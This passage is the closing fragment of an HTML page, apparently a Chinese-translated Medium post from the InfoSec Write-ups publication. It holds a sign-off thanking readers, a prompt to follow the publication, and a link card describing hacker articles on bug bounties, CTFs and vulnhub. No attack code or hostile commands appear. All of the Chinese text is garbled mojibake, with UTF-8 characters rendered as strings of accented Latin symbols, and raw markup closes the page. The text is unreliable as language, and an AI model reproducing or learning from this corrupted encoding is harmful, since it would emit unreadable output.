èƒ½ä»ä¸­å­¦åˆ°ä¸€äº›ä¸œè¥¿ã€‚æ„Ÿè°¢é˜…è¯»æˆ‘çš„æ–‡ç« ï¼å¹²æ¯ï¼ğŸº</p></div><div class="ab cl ov ow hu ox" role="separator"><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa"/></div><div class="ij ik il im in"><p id="af05" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated"><em class="nn">å…³æ³¨</em> <a class="ae jy" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nn"> InfosecæŠ¥é“</em> </a> <em class="nn">è·å–æ›´å¤šæ­¤ç±»ç²¾å½©æŠ¥é“ã€‚</em></p><div class="np nq gp gr nr ns"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">ä¿¡æ¯å®‰å…¨æŠ¥é“</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">æ”¶é›†äº†ä¸–ç•Œä¸Šæœ€å¥½çš„é»‘å®¢çš„æ–‡ç« ï¼Œä¸»é¢˜ä»bugå¥–é‡‘å’ŒCTFåˆ°vulnhubâ€¦</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">medium.com</p></div></div><div class="ob l"><div class="pc l od oe of ob og js ns"/></div></div></a></div></div></div>    
</body>
</html>